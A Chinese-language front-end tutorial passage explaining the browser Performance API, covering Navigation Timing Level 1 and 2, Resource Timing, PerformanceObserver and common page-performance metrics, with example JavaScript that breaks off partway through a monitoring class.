<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c218bb74a00a4e6b9ddcdadb0b6c76a2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGFienp6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471914&amp;x-signature=oeoseDXsdjiV6GQksYvul6EnPBw%3D" alt="Clipboard_Screenshot_1765866272.png" loading="lazy"/></p>
<p>这里着重介绍三个重要用途/过程，分别是<code>Performance Data</code>，<code>Navigation Timing</code>和<code>Resource Timing</code> 。</p>
<blockquote>
<p>下文主要是分享用途，用一些常用API来增强对特定内容的理解，有些用途中的API说的可能不完全，感兴趣的话还是自查MDN～</p>
</blockquote>
<h4 data-id="heading-11">Performance Data</h4>
<p><strong>Performance Data</strong>是整个Web性能监控的<strong>基础核心</strong>，它做为其他所有用途的基石，它主要回答三个问题：</p>
<ol>
<li>浏览器有哪些性能可以拿？</li>
<li>怎么拿？怎么监听？</li>
<li>怎么处理这些拿到的东西？</li>
</ol>
<p>在我们知道哪些性能可以拿的时候，我们首先要先知道性能数据从哪里来？</p>
<p>实际上，浏览器内部维护了一个<strong>性能条目队列</strong>，每当页面加载、资源加载、用户交互、开发者打点等事件发生，都会记录对应的性能数据，存储为不同类型的 <code>PerformanceEntry</code> 对象。</p>
<p>这些性能数据通过统一的接口 <code>performance.getEntries()</code> 或 <code>PerformanceObserver</code> 提供给开发者。</p>
<p>每个<strong>性能数据条目</strong>都属于某种“类型”，这些类型表示它是关于什么的性能数据。</p>























































<table><thead><tr><th>类型（<code>entryType</code>）</th><th>描述</th><th>举例</th></tr></thead><tbody><tr><td><code>"navigation"</code></td><td>页面整体加载的性能数据</td><td>首次加载页面的流程</td></tr><tr><td><code>"resource"</code></td><td>页面上资源加载的性能数据</td><td>加载图片的耗时</td></tr><tr><td><code>"paint"</code></td><td>首次绘制相关指标</td><td>FP、FCP等</td></tr><tr><td><code>"mark"</code></td><td>自定义的起始时间点</td><td><code>performance.mark('start')</code></td></tr><tr><td><code>"measure"</code></td><td>自定义的耗时段</td><td><code>performance.measure('duration', 'start', 'end')</code></td></tr><tr><td><code>"longtask"</code></td><td>超过 50ms 的长任务</td><td>主线程卡顿情况</td></tr><tr><td><code>"largest-contentful-paint"</code></td><td>最大内容绘制时间</td><td>LCP</td></tr><tr><td><code>"first-input"</code></td><td>首次交互的响应延迟</td><td>FID</td></tr><tr><td><code>"layout-shift"</code></td><td>页面布局变化</td><td>CLS</td></tr></tbody></table>
<blockquote>
<p>可以通过<code>performance.getEntriesByType("xxx")</code>获取对应的数据，在控制台试一试！</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8d08a10504744e10b958efcbac5555ca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGFienp6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471914&amp;x-signature=iecnJvT0uTFhLxpiRV4%2Fbrsi4pE%3D" alt="Clipboard_Screenshot_1765866301.png" loading="lazy"/></p>
</blockquote>
<p>上面我们所说的获取<strong>性能资源条目</strong>实际上并不够灵活，如果你希望实时监听性能事件（比较经典的是LCP、资源加载等），使用<code>PerformanceObservers</code>是最佳方式。</p>
<p>例如：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> observer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PerformanceObserver</span>(<span class="hljs-function">(<span class="hljs-params">list</span>) =&gt;</span> {
  list.<span class="hljs-title function_">getEntries</span>().<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">entry</span> =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"实时观察到的性能数据："</span>, entry);
  });
});

observer.<span class="hljs-title function_">observe</span>({
	<span class="hljs-comment">// 设定监听的资源条目</span>
  <span class="hljs-attr">entryTypes</span>: [<span class="hljs-string">"paint"</span>, <span class="hljs-string">"resource"</span>, <span class="hljs-string">"mark"</span>, <span class="hljs-string">"measure"</span>]
});
</code></pre>
<p>在现代性能监控中，<code>PerformanceObserver</code>早已成为构建RUM的系统的核心组件了。</p>
<p>到这里我们已经“替”<code>Performance Data</code>回答了两个问题了，第三个问题详见后续：分析性能数据及影响因素。</p>
<p>Performance Data 这一部分，主要<strong>就是表述如何从浏览器性能引擎中提取各种“关键时刻”的数据，并将其用于性能分析、优化与监控</strong>。</p>
<h4 data-id="heading-12">Navigation Timing</h4>
<p><strong>Navigation Timing 主要关注整个页面的导航过程</strong>，对于单个资源（例如图片、脚本等）的加载时间没有详细的度量。</p>
<p>下面是2012年W3C发布的第一版的Navigation Timing的处理模型：</p>
<p>详情见：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.w3.org%2FTR%2Fnavigation-timing%2F" target="_blank" title="https://www.w3.org/TR/navigation-timing/" ref="nofollow noopener noreferrer">W3C Navigation Timing Level 1</a></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/751b4c94f50044dd9f9a9b852150c5ce~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGFienp6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471914&amp;x-signature=snuqf3tMikeP6YmBR8XC6%2FdIP9w%3D" alt="Clipboard_Screenshot_1765866326.png" loading="lazy"/></p>
<p>Level 1 提供了统一的 API，<strong>允许开发者在不同浏览器和平台上以一致的方式获取页面加载的关键时间点</strong>，方便性能分析和比较。</p>
<p>它涵盖了从重定向、DNS 查询、TCP 连接、请求发送、响应接收，到 DOM 解析和加载事件等多个阶段，帮助开发者定位性能瓶颈。</p>
<p>Level 1的核心接口是<code>PerformanceTiming</code>和<code>PerformanceNavigation</code> ，分别通过<code>performance.timing</code> 和<code>performance.navigation</code> 来访问。</p>
<p>Level 1 的优点非常明显：</p>
<ol>
<li>
<p>高标准的API</p>
<p>将页面导航的各类时间信息内容进行集成</p>
</li>
<li>
<p>细粒度的时间点</p>
</li>
<li>
<p>促使开发人员进行性能优化</p>
<p>页面数据摆在你的面前，迫使你对耗时处进行修改优化</p>
</li>
</ol>
<p>虽然 Level 1 在很多方面已经做的足够好了，但是仍然存在一定的局限性：</p>
<ol>
<li>
<p>数据粒度有限</p>
<p>虽然时间点比较多，但是对于更加更加细粒度的资源加载和用户交互性能指标支持仍然有限，在应用越来越复杂的场景下无法满足性能分析需求</p>
</li>
<li>
<p>需要使用多API处理同一个逻辑</p>
</li>
<li>
<p>隐私和安全限制</p>
<p>出于安全和隐私考虑，某些时间点在跨域请求中可能不可用，导致数据不完整。</p>
</li>
</ol>
<p>不得不承认，Level 1 是网页性能测量领域的重要里程碑，它为开发者提供了基础且标准化的导航时间数据，极大地推动了前端性能优化的发展。但随着需求的提升和技术的进步，Level 1 的功能已显不足，它无法处理多种场景下的复杂情况，使用它的同时<strong>通常要结合其他性能API一起使用</strong>，这样才可以获得更全面和精细的性能分析能力。</p>
<blockquote>
<p>所谓长江后浪推前浪 一浪更比一浪强～ Navigation Timing Level 2 应运而生</p>
</blockquote>
<p>下面是W3C第二版的Navigation Timing的处理模型：</p>
<p>详情见：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.w3.org%2FTR%2Fnavigation-timing-2%2F" target="_blank" title="https://www.w3.org/TR/navigation-timing-2/" ref="nofollow noopener noreferrer">W3C Navigation Timing Level 2</a></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d809a2a08a7e4d1780304781aedbe7af~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGFienp6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471914&amp;x-signature=Op2qQWdNxLtPnOnOPZFSCejmBF0%3D" alt="Clipboard_Screenshot_1765866342.png" loading="lazy"/></p>
<p>Level 2 是对 Level 1 的扩展和改进。</p>
<p>从图中不难看出，Level 2 相较于 Level 1 有更多的时间节点、更灵活的接口设计、更丰富的测量指标、更强大的跨域资源的处理、更权威的配色、更兢兢业业的提出人员…</p>
<p>针对 Level 1 的局限性，Level 2 做了一些优化：</p>








































<table><thead><tr><th><strong>Level 1 的局限性</strong></th><th><strong>Level 1 的局限性细则</strong></th><th><strong>Level 2 的优化</strong></th></tr></thead><tbody><tr><td><strong>数据粒度有限</strong></td><td>时间点多，但缺乏对资源级别和用户交互的详细度量。</td><td/></tr><tr><td>时间精度<strong>以毫秒为单位。</strong></td><td><strong>时间点更为丰富（<strong>继承了<code>Resource Timing</code></strong>），方便结合现代网页进行更全面的剖析。</strong></td><td/></tr><tr><td>时间精度<strong>以微秒为单位。</strong></td><td/><td/></tr><tr><td>需要使用多API处理同一个逻辑</td><td>需要使用<code>PerformanceTiming</code> 和<code>PerformanceNavigation</code></td><td><strong>将所有导航相关指标整合为单一对象</strong>。只需使用<code>PerformanceNavigationTiming</code>即可</td></tr><tr><td><strong>隐私和安全限制</strong></td><td>跨域请求中某些时间点不可用，可能导致数据不完整</td><td><strong>增强了对跨域资源的性能数据暴露支持，<strong>在保障隐私的同时</strong>提供了更精细的资源数据监控</strong>，减少数据泄露的风险。</td></tr><tr><td/><td/><td>支持 <code>PerformanceObserver</code> 监听</td></tr></tbody></table>
<p>Level 1 的时间精度是以毫秒为单位，基于<code>Date.now()</code>，如果修改系统时间，<code>Date.now()</code>会跟着变化；Level 2 是名副其实的高精度（High Resolution Time, HRTime）时间，所有时间戳基于<code>performance.timeOrigin</code> ，以微秒精度为准，<strong>不会随着系统时间的修改而变化的</strong>。</p>
<blockquote>
<p>由于只包含当前文档，因此通常只有一个 <code>PerformanceNavigationTiming</code> 对象可供观察。它扩展了 <code>PerformanceEntry</code> 接口，<code>entryType</code> 为 <code>"navigation"</code> ，并且继承自<code>PerformanceEntry</code>和<code>PerformanceResourceTiming</code>，因此获取文档过程中可以使用指定<strong>性能资源条目</strong>的方式，所有时间戳也都可用。</p>
</blockquote>
<p>我们可以通过一个小例子来直观看出二者从使用角度上的区别：</p>
<p>现在提一个最最最ez的需求：监听浏览器的<code>load</code>事件，计算并打印页面的加载时间。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'load'</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-comment">// Level 1</span>
	<span class="hljs-keyword">const</span> timing = <span class="hljs-variable language_">window</span>.<span class="hljs-property">performance</span>.<span class="hljs-property">timing</span>;
	<span class="hljs-keyword">const</span> loadTime = timing.<span class="hljs-property">loadEventEnd</span> - timing.<span class="hljs-property">navigationStart</span>;
	<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Level 1 页面的加载时间为：'</span>, loadTime, <span class="hljs-string">'ms'</span>);

  <span class="hljs-comment">// Level 2</span>
  <span class="hljs-keyword">const</span> navEntries = performance.<span class="hljs-title function_">getEntriesByType</span>(<span class="hljs-string">'navigation'</span>);
  <span class="hljs-keyword">if</span> (navEntries.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
	  <span class="hljs-keyword">const</span> navTiming = navEntries[navEntries.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>];
	  <span class="hljs-keyword">const</span> loadTime2 = navTiming.<span class="hljs-property">loadEventEnd</span> - navTiming.<span class="hljs-property">startTime</span>;
	  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Level 2 页面的加载时间为：'</span>, loadTime2, <span class="hljs-string">'ms'</span>);
	}
});
</code></pre>
<blockquote>
<p>这里有一个需要区分的点，即使Level 2 采用了更高的时间精度，最终输出结果也仍然转换为毫秒。<strong>因为浏览器内部的性能时间戳通常都使用毫秒级别</strong>。</p>
</blockquote>
<p>两段代码实现的功能是一致的，随便找一个网页的控制台进行测试：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ecae00cc19a846ec8cfdac24593f2872~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGFienp6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471914&amp;x-signature=5bYf55zNjWrYCWyOylGbtfXlbkw%3D" alt="Clipboard_Screenshot_1765866361.png" loading="lazy"/></p>
<p>可以很直观地看到，Level 2 的加载时间的精度更加Good。</p>
<p>稍微复杂一点点，Level 1 就无法”只“使用<code>PerformanceTiming</code>独自胜任。</p>
<p>假设你想<strong>获取页面加载的详细时间</strong>，并且需要知道<strong>页面是否是从缓存加载的</strong>，以此来优化性能。</p>
<p>在Level1中你需要将<code>PerformanceTiming</code>和<code>PerformanceNavigation</code>结合来使用：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'load'</span>, <span class="hljs-function">() =&gt;</span> {
	<span class="hljs-comment">// PerformanceTiming</span>
	<span class="hljs-keyword">const</span> timing = <span class="hljs-variable language_">window</span>.<span class="hljs-property">performance</span>.<span class="hljs-property">timing</span>;
	<span class="hljs-keyword">const</span> loadTime = timing.<span class="hljs-property">loadEventEnd</span> - timing.<span class="hljs-property">navigationStart</span>;
	
	<span class="hljs-comment">// PerformanceNavigation</span>
	<span class="hljs-keyword">const</span> navigation = <span class="hljs-variable language_">window</span>.<span class="hljs-property">performance</span>.<span class="hljs-property">navigation</span>;
	<span class="hljs-keyword">const</span> isFromCache = navigation.<span class="hljs-property">type</span> === <span class="hljs-variable language_">window</span>.<span class="hljs-property">performance</span>.<span class="hljs-property">navigation</span>.<span class="hljs-property">TYPE_BACK</span>;
	
	<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`页面的加载时间为: <span class="hljs-subst">${loadTime}</span>ms`</span>);
	<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`页面是否从缓存加载: <span class="hljs-subst">${isFromCache ? <span class="hljs-string">'是'</span> : <span class="hljs-string">'否'</span>}</span>`</span>);
});
</code></pre>
<p>在Level2中你只需使用<code>PerformanceNavigationTiming</code>即可：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'load'</span>, <span class="hljs-function">() =&gt;</span> {
	<span class="hljs-comment">// PerformanceNavigationTiming</span>
	<span class="hljs-keyword">const</span> navigationTiming = performance.<span class="hljs-title function_">getEntriesByType</span>(<span class="hljs-string">'navigation'</span>)[<span class="hljs-number">0</span>];
	<span class="hljs-keyword">const</span> loadTime = navigationTiming.<span class="hljs-property">loadEventEnd</span> - navigationTiming.<span class="hljs-property">navigationStart</span>;
	<span class="hljs-keyword">const</span> isFromCache = navigationTiming.<span class="hljs-property">type</span> === <span class="hljs-string">'back_forward'</span>;
	
	<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`页面的加载时间为: <span class="hljs-subst">${loadTime}</span>ms`</span>);
	<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`页面是否从缓存加载: <span class="hljs-subst">${isFromCache ? <span class="hljs-string">'是'</span> : <span class="hljs-string">'否'</span>}</span>`</span>);
});
</code></pre>
<p>很明显本着减少代码复杂的角度，Level2更胜一筹。</p>
<p>再稍微复杂一点点：假设我们需要<strong>实时监听用户每次页面导航的性能数据</strong>，<strong>收集微秒级别高精度的加载指标</strong>，并<strong>能区分导航类型</strong>（首次打开、刷新、返回等）。传统 Level 1 只能在页面加载完成后获取一次静态数据，且时间精度较低，无法满足在线监控要求。</p>
<p>在Level2中，我们可以结合<code>PerformanceObserver</code>来使用：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> navObserver = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PerformanceObserver</span>(<span class="hljs-function">(<span class="hljs-params">list</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> entries = list.<span class="hljs-title function_">getEntries</span>();
  entries.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">entry</span> =&gt;</span> {
    <span class="hljs-keyword">if</span> (entry.<span class="hljs-property">entryType</span> === <span class="hljs-string">'navigation'</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'导航类型:'</span>, entry.<span class="hljs-property">type</span>);
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'重定向次数:'</span>, entry.<span class="hljs-property">redirectCount</span>);

      <span class="hljs-comment">// 精确微秒级时间戳</span>
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Fetch Start:'</span>, entry.<span class="hljs-property">fetchStart</span>);
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'DOM Interactive:'</span>, entry.<span class="hljs-property">domInteractive</span>);
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Load Event End:'</span>, entry.<span class="hljs-property">loadEventEnd</span>);
      <span class="hljs-comment">//...</span>

      <span class="hljs-comment">// 关键指标计算</span>
      <span class="hljs-keyword">const</span> backendTime = entry.<span class="hljs-property">responseStart</span> - entry.<span class="hljs-property">requestStart</span>;
      <span class="hljs-keyword">const</span> frontendTime = entry.<span class="hljs-property">loadEventEnd</span> - entry.<span class="hljs-property">domInteractive</span>;
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`服务器响应时间: <span class="hljs-subst">${backendTime.toFixed(<span class="hljs-number">3</span>)}</span> ms`</span>);
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`前端处理时间: <span class="hljs-subst">${frontendTime.toFixed(<span class="hljs-number">3</span>)}</span> ms`</span>);

      <span class="hljs-comment">// 后续处理...</span>
    }
  });
});

<span class="hljs-comment">// 开始监听and确保捕获页面加载前的记录</span>
navObserver.<span class="hljs-title function_">observe</span>({ <span class="hljs-attr">entryTypes</span>: [<span class="hljs-string">'navigation'</span>], <span class="hljs-attr">buffered</span>: <span class="hljs-literal">true</span> });
</code></pre>
<p>不得否认，虽然 Level 1 官方已经不建议使用了，但是我相信很多项目还是使用的 Level 1 提供的<code>performance.timing</code> ，主要就是两点：</p>
<ol>
<li>
<p>兼容性强</p>
<p>毕竟H5时代就存在，所有主流浏览器都支持</p>
</li>
<li>
<p>简单场景下 Level 1 足够用了</p>
<p>虽然<strong>精度低</strong>并且无法通过<code>PerformanceObserver</code>实时监听，但是已存的字段可以满足大部分需求，并且不是所有场景都对“精度”和“实时”要求太高</p>
</li>
</ol>
<p>所以说，即使 Navigation Timing Level 2 提供了更精细、统一的性能条目系统，Level 1 仍在许多项目中“顽强地存活”着，特别是在需要广泛兼容性和低维护成本的场景下。</p>
<p>但是这影响你了解并熟知 Level 2 嘛？我觉得不。很多知识都面临这个问题，我始终觉得跟进稍微“新”一些的东西并无坏处，至少我们能从“新”的东西中知道“老”的东西哪里有一些不好的地方，也可以知道所谓“新”东西有什么好的地方，这本来就是一个仁者见仁智者见智的问题。</p>
<h4 data-id="heading-13">Resource Timing</h4>
<p><strong>Resource Timing</strong> 同样也是性能分析中非常重要的一部分，它允许开发者详细了解页面中<strong>各类资源</strong>（如图片、脚本等）的加载性能。它的核心接口是 <code>PerformanceResourceTiming</code>，通过 <code>window.performance.getEntriesByType('resource')</code> 获取。</p>
<p>详情见：<a href="https://link.juejin.cn?target=https%3A%2F%2Fw3c.github.io%2Fresource-timing%2F%23attribute-descriptions" target="_blank" title="https://w3c.github.io/resource-timing/#attribute-descriptions" ref="nofollow noopener noreferrer">Resource Timing</a></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/866ec862b0224e5c9c6a050ffc7fbf48~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGFienp6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471914&amp;x-signature=JFA7Y9GOUy%2BFFv%2Fob03ptisz6v4%3D" alt="Clipboard_Screenshot_1765866378.png" loading="lazy"/></p>
<p>它提供了详细的资源加载性能数据，如图所示。这使得开发者能够识别出哪些资源加载较慢，进而采取针对性的优化措施。<strong>与 Navigation Timing 相比，Resource Timing 能够捕获页面上每个资源的加载性能，而不仅仅是页面本身</strong>。</p>
<p>可以使用：</p>
<pre><code class="hljs language-ini" lang="ini">// 获取所有资源的性能条目
const <span class="hljs-attr">resources</span> = performance.getEntriesByType(<span class="hljs-string">'resource'</span>)<span class="hljs-comment">;</span>
console.log(resources)<span class="hljs-comment">;</span>
</code></pre>
<p>打到控制台中就是这样的效果：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/12e9860313534b8dba2a4b2d749858cb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGFienp6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471914&amp;x-signature=eLlCnKH4o26JYN8fx9MhGyu%2BpuE%3D" alt="Clipboard_Screenshot_1765866389.png" loading="lazy"/></p>
<p>这样就可以非常简易的获取到各类资源的加载信息，以便后续的上报/分析。</p>
<h4 data-id="heading-14">简化版时间线与标准发展简图</h4>
<p>Performance API本身的API规范和对象类型/接口的名字看起来比较“混乱”，这里做一个简化版的时间线与标准发展简图供理解参考（上文提到的一些已加粗处理）：</p>





































<table><thead><tr><th>规范名称</th><th>描述</th></tr></thead><tbody><tr><td><strong>Navigation Timing Level 1（2012）</strong></td><td>提供 <code>performance.timing</code> 等时间戳字段，核心关注<strong>页面加载流程</strong></td></tr><tr><td>High Resolution Time Level 1（2012）</td><td>引入 <code>performance.now()</code> 精准时间</td></tr><tr><td><strong>Performance Timeline Level 1（2012）</strong></td><td>定义 <code>PerformanceEntry</code> 接口，最早引入 <code>performance.getEntries()</code></td></tr><tr><td><strong>Resource Timing Level 1（2013）</strong></td><td>使用 <code>performance.getEntriesByType('resource')</code> 获取资源加载性能</td></tr><tr><td>User Timing Level 1（2012）</td><td>引入 <code>mark()</code> 和 <code>measure()</code> 并将它们作为 <code>PerformanceEntry</code> 出现在 <code>getEntries()</code> 中</td></tr><tr><td><strong>Navigation Timing Level 2（2017）</strong></td><td>使用 <code>PerformanceNavigationTiming</code> 替代老的 <code>performance.timing</code>，统一纳入 Timeline</td></tr><tr><td><strong>Performance Timeline Level 2+</strong></td><td>支持 <code>PerformanceObserver</code>、buffered 监听等</td></tr></tbody></table>
<p>再来一个名字很像但是并非一样的：</p>



































<table><thead><tr><th/><th>PerformanceTiming</th><th>PerformanceTimeline</th></tr></thead><tbody><tr><td>定义</td><td>一个对象类型/接口</td><td>一个API标准体系/规范</td></tr><tr><td>用途</td><td>页面加载时间戳</td><td>各类性能条目管理</td></tr><tr><td>范围</td><td>仅限页面加载</td><td>包括资源加载、绘制、自定义打点、CLS、LCP 等</td></tr><tr><td>API</td><td><code>performance.timing</code></td><td><code>getEntries()</code>、<code>PerformanceObserver</code></td></tr><tr><td>status</td><td>已存在但<strong>逐步废弃中</strong></td><td>当前性能 API 的核心基础</td></tr></tbody></table>
<h3 data-id="heading-15">页面性能监控的常见指标</h3>
<p>页面性能监控的常见指标用于衡量和优化用户在访问网站或应用时的体验。通过这些指标，开发者可以了解到页面加载过程中的瓶颈，并针对性地进行优化，从而<strong>提高页面的响应速度和稳定性</strong>。</p>
<p>相信前端的朋友们多多少少都知道一些（不，我信你一定知道一些）常见指标，关于页面性能监控的指标大致分为四类：<strong>加载性能</strong>、<strong>交互性能</strong>、<strong>渲染性能</strong>和<strong>网络性能</strong>：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3a54d92c0f5c48a8ae742213c9ce52dc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGFienp6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471914&amp;x-signature=3J9f2e2XSEpaPQhxy8oUNGbdKHw%3D" alt="Clipboard_Screenshot_1765866403.png" loading="lazy"/></p>
<p>（图中仅列举部分指标）</p>
<p>不同大类的指标通常衡量不同的场景的性能情况，我们可以根据相应的需求进行相应指标的获取。换句话说，每个性能指标都有自己独特的衡量价值，各个性能指标理应综合全面的去分析。</p>
<p>用一个时序图来更直观的体现出某些指标处在的阶段：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5cac0732e2324491b0ad219c196ce075~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGFienp6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471914&amp;x-signature=43IScXNdGf76CNFsQY2rhYzIy20%3D" alt="Clipboard_Screenshot_1765866417.png" loading="lazy"/></p>
<p>大多数指标是我们衡量网页加载速度的重要依据，这些指标在真实监控中大多都可以通过<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FAPI%2FPerformance_API" target="_blank" title="https://developer.mozilla.org/en-US/docs/Web/API/Performance_API" ref="nofollow noopener noreferrer"><code>Performance API</code></a> 获取/计算，总体来讲还是相对轻松的～</p>
<h3 data-id="heading-16">封装一个简单获取RUM的类</h3>
<p>在真实项目中，我们通常不会逐个编写性能数据的获取逻辑，因为这种方式不适合实际应用。更好的方法是通过 <code>PerformanceObserver</code> 进行实时监听，对所需的性能数据进行<strong>动态监控</strong>。一旦监测到相应的指标，就立即进行数据获取和处理。</p>
<p>这里写一个监测各类简单指标的类做个小例子：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">TIME</span> = <span class="hljs-number">100</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PerformanceMetrics</span> {
  private <span class="hljs-attr">metrics</span>: any = {};
  private <span class="hljs-attr">observer</span>: <span class="hljs-title class_">PerformanceObserver</span> | <span class="hljs-literal">null</span> = <span class="hljs-literal">null</span>;
  private <span class="hljs-attr">promise</span>: <span class="hljs-title class_">Promise</span>&lt;any&gt;;

  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">promise</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">collectPerformance</span>();
  }

	<span class="hljs-comment">// 开始监听</span>
  private <span class="hljs-title function_">startObserving</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">observerCallback</span> = (<span class="hljs-params">list: PerformanceObserverEntryList, observer: PerformanceObserver</span>) =&gt; {
      list.<span class="hljs-title function_">getEntries</span>().<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">entry</span> =&gt;</span> {
        <span class="hljs-comment">// 监听导航数据</span>
        <span class="hljs-keyword">if</span> (entry.<span class="hljs-property">entryType</span> === <span class="hljs-string">'navigation'</span>) {
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">metrics</span>.<span class="hljs-property">navigationStart</span> = entry.<span class="hljs-property">startTime</span>;
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">metrics</span>.<span class="hljs-property">domContentLoaded</span> = entry.<span class="hljs-property">domContentLoadedEventEnd</span>;
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">metrics</span>.<span class="hljs-property">loadEventEnd</span> = entry.<span class="hljs-property">loadEventEnd</span>;
        }

        <span class="hljs-comment">// 监听绘制数据</span>
        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (entry.<span class="hljs-property">entryType</span> === <span class="hljs-string">'paint'</span>) {
          <span class="hljs-keyword">if</span> (entry.<span class="hljs-property">name</span> === <span class="hljs-string">'first-paint'</span>) {
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">metrics</span>.<span class="hljs-property">fp</span> = entry.<span class="hljs-property">startTime</span>;
          } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (entry.<span class="hljs-property">name</span> === <span class="hljs-string">'first-contentful-paint'</span>) {
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">metrics</span>.<span class="hljs-property">fcp</span> = entry.<span class="hljs-property">startTime</span>;
          }
        }

        <span class="hljs-comment">// 监听资源加载数据</span>
        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (entry.<span class="hljs-property">entryType</span> === <span class="hljs-string">'resource'</span> &amp;&amp; (entry.<span class="hljs-property">initiatorType</span> === <span class="hljs-string">'script'</span> || entry.<span class="hljs-property">initiatorType</span> === <span class="hljs-string">'link'</span>)) {
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">metrics</span>.<span class="hljs-property">resourceLoadTimes</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">metrics</span>.<span class="hljs-property">resourceLoadTimes</span> || [];
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">metrics</span>.<span class="hljs-property">resourceLoadTimes</span>.<span class="hljs-title function_">push</span>({
            <span class="hljs-attr">name</span>: entry.<span class="hljs-property">name</span>,
            <span class="hljs-attr">duration</span>: entry.<span class="hljs-property">responseEnd</span> - entry.<span class="hljs-property">startTime</span>
          });
        }
      });

      <span class="hljs-comment">// 如果重要数据收集完毕，停止监听</span>
